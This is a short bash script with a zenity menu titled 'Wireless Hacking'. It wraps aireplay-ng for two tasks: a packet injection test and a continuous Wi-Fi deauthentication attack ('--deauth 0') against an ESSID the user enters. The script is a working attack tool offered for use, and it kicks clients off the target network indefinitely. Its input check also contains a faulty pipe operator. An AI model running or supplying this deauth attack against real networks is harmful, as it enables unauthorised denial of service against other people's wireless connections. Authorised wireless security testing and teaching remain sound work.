prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" "Deauth" --width=300 --height=300)

check_adapter() {
iwconfig | zenity --text-info --title="Available Adapter List" --width=500 --height=300
}

if [ "$prompt1" == "Injection Test" ]
then
 check_adapter
 wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
  if [ -z "$wlan" ]
   then
     zenity --info --title="Error" --text="Please insert input"
     exit 1
  fi
 gnome-terminal -- sudo aireplay-ng -9 $wlan
fi

if [ "$prompt1" == "Deauth" ]
then
 check_adapter
 wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
 essid=$(zenity --entry --title="ESSID" --text="ESSID:" --width=300)
  if [ -z "$wlan" ] | [ -z "$essid" ]
   then
     zenity --info --title="Error" --text="Please insert input"
     exit 1
  fi
 zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -e "$essid" "$wlan"
fi
